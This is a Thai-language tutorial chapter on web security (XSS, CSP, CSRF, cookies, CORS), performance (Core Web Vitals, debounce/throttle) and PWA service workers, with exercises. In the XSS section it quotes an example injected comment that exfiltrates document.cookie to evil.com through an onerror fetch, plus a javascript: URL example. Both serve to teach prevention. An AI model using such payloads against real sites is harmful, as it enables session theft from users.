# บทที่ 13: Web Security, Performance & PWA

> หัวข้อใน roadmap: Web Security Basics (HTTPS, CORS, CSP, OWASP) · Web Performance (Core Web Vitals, Lighthouse) · Progressive Web Apps (Service Workers, Manifest)

---

# ส่วนที่ 1: Security

## 1. XSS (Cross-Site Scripting): ช่องโหว่อันดับต้นๆ ของ frontend
XSS เกิดเมื่อข้อความที่ผู้ใช้กรอกถูกแทรกลงหน้าเว็บ **แล้ว browser มองว่าเป็นโค้ด**
```js
// ผู้ใช้โพสต์ comment ว่า:  <img src=x onerror="fetch('https://evil.com?c='+document.cookie)">
commentBox.innerHTML = comment.text;  // ❌ โค้ดของผู้โจมตีถูกรันในหน้าของเรา ซึ่งเห็น cookie และข้อมูลทุกอย่างในหน้า
commentBox.textContent = comment.text; // ✅ แสดงเป็นข้อความธรรมดา
```
**วิธีป้องกัน**
- ใช้ `textContent`, `createElement` และ `setAttribute` แทน `innerHTML`
- framework ส่วนใหญ่ escape ให้อัตโนมัติ เช่น React `{text}` และ Vue `{{ text }}`
  แต่ **ช่องทางเลี่ยง** อย่าง `dangerouslySetInnerHTML` และ `v-html` ยังอันตรายเหมือนเดิม
- ถ้าจำเป็นต้องแสดง HTML ที่ผู้ใช้เขียน ให้ทำความสะอาดก่อนด้วย **DOMPurify**
- **URL ก็อันตรายได้**: `<a href="javascript:alert(1)">` จึงต้องตรวจ protocol ก่อนใส่ลง `href` หรือ `src`

## 2. CSP (Content Security Policy)
CSP เป็น header ที่บอก browser ว่าหน้านี้โหลด script จากที่ไหนได้บ้าง ช่วยเป็นด่านที่สองถ้า XSS หลุดเข้ามาได้
```http
Content-Security-Policy: default-src 'self'; script-src 'self'; img-src 'self' https://images.example.com; object-src 'none'
```
เมื่อตั้งแบบนี้ inline script และ `onerror="..."` จะถูก block ถึงผู้โจมตีจะแทรก HTML เข้ามาได้ก็รันโค้ดไม่ได้
(แบบฝึกหัดในโปรเจกต์นี้ใช้ inline script จึงไม่ได้เปิด CSP ไว้)

## 3. CSRF, Cookie และ CORS
- **CSRF**: เว็บของผู้โจมตีแอบส่ง request ไปที่เว็บเรา โดย browser แนบ cookie ของผู้ใช้ไปให้อัตโนมัติ
  ป้องกันด้วยการตั้ง cookie `SameSite=Lax` หรือ `Strict` และใช้ CSRF token
- **Cookie flags** ที่ควรตั้ง
  - `HttpOnly`: JS อ่าน cookie ไม่ได้ ช่วยป้องกันกรณี XSS ขโมย session
  - `Secure`: ส่งผ่าน HTTPS เท่านั้น
  - `SameSite`: ควบคุมการส่ง cookie ไปพร้อม request ที่มาจากเว็บอื่น
- **อย่าเก็บ token ใน localStorage** เพราะถ้าโดน XSS ก็ถูกอ่านได้ทันที ทางที่ปลอดภัยกว่าคือ cookie แบบ HttpOnly
- **CORS** ไม่ได้ทำหน้าที่ปกป้อง server แต่ปกป้อง **ผู้ใช้** โดยไม่ให้เว็บอื่นอ่านข้อมูลของผู้ใช้จาก API ของเรา
  ผ่าน browser ของผู้ใช้เอง ส่วนเครื่องมืออย่าง curl ยังเรียก API ได้ตามปกติ
- **HTTPS** ต้องใช้เสมอ และเพิ่ม header `Strict-Transport-Security` (HSTS) เพื่อบังคับให้ใช้ HTTPS ตลอด

## 4. เรื่องอื่นที่ต้องระวัง
- **ห้ามใส่ secret (API key) ไว้ในโค้ด frontend** เพราะใครก็เปิด DevTools ดูได้ ถ้าจำเป็นต้องใช้ ให้เรียกผ่าน backend ของเราเอง
- ใส่ `rel="noopener"` ให้ลิงก์ที่ใช้ `target="_blank"` (browser ใหม่ๆ ทำให้อัตโนมัติแล้ว)
- **Supply chain**: package บน npm ก็อาจถูกฝังโค้ดอันตรายได้ ให้รัน `npm audit`, ใช้ lockfile และเลือก dependency อย่างระวัง
- **Subresource Integrity**: `<script src="cdn…" integrity="sha384-…">` ทำให้ browser ตรวจว่าไฟล์จาก CDN ไม่ถูกแก้ไข
- อ่านเพิ่มเติม: **OWASP Top 10**

---

# ส่วนที่ 2: Performance

## 5. Core Web Vitals (Google ใช้วัดประสบการณ์ผู้ใช้)
| Metric | วัดอะไร | ค่าที่ดี | สาเหตุที่พบบ่อยเมื่อค่าแย่ |
|---|---|---|---|
| **LCP** (Largest Contentful Paint) | element ที่ใหญ่ที่สุดแสดงผลเมื่อไร | < 2.5s | รูป hero ใหญ่, server ตอบช้า, CSS หรือ JS บล็อกการ render |
| **INP** (Interaction to Next Paint) | กดแล้ว UI ตอบสนองเร็วแค่ไหน | < 200ms | JS ทำงานหนักบน main thread |
| **CLS** (Cumulative Layout Shift) | layout กระโดดระหว่างโหลดมากแค่ไหน | < 0.1 | รูปที่ไม่ได้กำหนดขนาด, โฆษณาหรือ font ที่โหลดทีหลัง |

## 6. วิธีที่ได้ผลจริง
- **รูปภาพ**: ใช้ `loading="lazy"` กับรูปที่อยู่นอกจอ, ใส่ `width` และ `height` ทุกรูปเพื่อกัน CLS,
  ใช้ format AVIF หรือ WebP, ใช้ `srcset` ให้ขนาดรูปพอดีจอ และใส่ `fetchpriority="high"` ให้รูป LCP
- **JS**: ใช้ code splitting (`import()`), ทำ tree-shaking, ลด dependency และใช้ `defer`
- **งานหนักบน main thread**: แบ่งงานเป็นชิ้นเล็กๆ, ย้ายไป Web Worker และใช้ **debounce/throttle** กับ event ที่เกิดถี่
- **Network**: ใช้ CDN, บีบอัดด้วย gzip หรือ brotli, ใช้ HTTP/2 และตั้ง cache header ให้ดี (บทที่ 01)
  ใช้ `<link rel="preconnect">` สำหรับ domain สำคัญ
- **Render**: ใช้ `content-visibility: auto` กับส่วนที่อยู่นอกจอ และ animate ด้วย `transform`/`opacity`
- **List ยาวมาก**: ใช้ virtualization คือ render เฉพาะแถวที่เห็นบนจอ
- **วัดก่อนแก้เสมอ**: ใช้ Lighthouse, แท็บ Performance ใน DevTools และ [PageSpeed Insights](https://pagespeed.web.dev/)

## 7. Debounce กับ Throttle
```
event:     ||||||||||          ||||||
debounce:            ✓               ✓   (ทำงานเมื่อหยุดยิง event ไป ms มิลลิวินาที เหมาะกับช่องค้นหาและ resize)
throttle:  ✓    ✓    ✓         ✓    ✓    (ทำงานได้ไม่เกิน 1 ครั้งต่อ ms มิลลิวินาที เหมาะกับ scroll และ mousemove)
```

---

# ส่วนที่ 3: PWA (Progressive Web App)
ทำให้เว็บ **ติดตั้งลงเครื่องได้** และ **ใช้งานได้ตอนออฟไลน์**
1. **HTTPS** (ยกเว้น `localhost` ที่ใช้ได้เลย)
2. **Web App Manifest**: ไฟล์ JSON ที่บอกชื่อแอป, ไอคอน, สี และรูปแบบการแสดงผล
   ```html
   <link rel="manifest" href="manifest.webmanifest">
   ```
3. **Service Worker**: script ที่ทำหน้าที่เป็น proxy อยู่ระหว่างหน้าเว็บกับ network
   ```
   หน้าเว็บ ──fetch──▶ Service Worker ──▶ Cache?  ──▶ Network?
   ```
   - lifecycle: `install` (เก็บไฟล์ลง cache ล่วงหน้า) → `activate` (ลบ cache เวอร์ชันเก่า) → `fetch` (ดักทุก request)
   - กลยุทธ์ที่ใช้บ่อย
     - **Cache first**: เร็ว เหมาะกับไฟล์ที่ไม่ค่อยเปลี่ยน เช่น รูปและ font
     - **Network first**: ได้ข้อมูลใหม่เสมอ ถ้าออฟไลน์ค่อยใช้ cache เหมาะกับ HTML และ API
     - **Stale-while-revalidate**: ตอบจาก cache ทันที แล้วอัปเดต cache เบื้องหลัง
   - ในการทำงานจริงมักใช้ **Workbox** หรือ `vite-plugin-pwa` แทนการเขียนเอง

ดู Service Worker ได้ใน DevTools → **Application** → Service Workers / Cache Storage / Manifest
ถ้า SW ทำให้งง ให้กด **Unregister** หรือติ๊ก "Update on reload"

---

## 🧪 แบบฝึกหัด
เปิด [`exercise.html`](exercise.html) แล้วแก้ [`exercise.js`](exercise.js) และ [`sw.js`](sw.js)
1. `escapeHTML(str)`
2. `renderComment(container, comment)` แสดง comment แบบปลอดภัย (test จะลองยิง XSS ใส่)
3. `safeUrl(url)` ไม่ยอมรับ `javascript:` URL
4. `debounce(fn, ms)`
5. `throttle(fn, ms)`
6. แก้ HTML ของ gallery ให้ใช้ lazy loading และกำหนดขนาดรูปเพื่อกัน CLS
7. ลงทะเบียน Service Worker และให้ `sw.js` เก็บไฟล์ลง cache (แบบ network-first)

หลังทำข้อ 7 เสร็จ ให้ลอง DevTools → Network → เลือก **Offline** แล้วรีเฟรช หน้าเว็บต้องยังเปิดได้

**ลองเพิ่มเติม**: เปิด Lighthouse (DevTools → Lighthouse) แล้ว Analyze หน้านี้ จากนั้นดูคะแนน Performance และ Best Practices

## ✅ เช็กความเข้าใจ
- ทำไม `textContent` ถึงปลอดภัยกว่า `innerHTML`
- ทำไมรูปที่ไม่มี `width`/`height` ถึงทำให้ CLS แย่
- ทำไมเวลาพัฒนาถึงไม่ควรใช้ cache-first กับไฟล์ JS ของตัวเอง
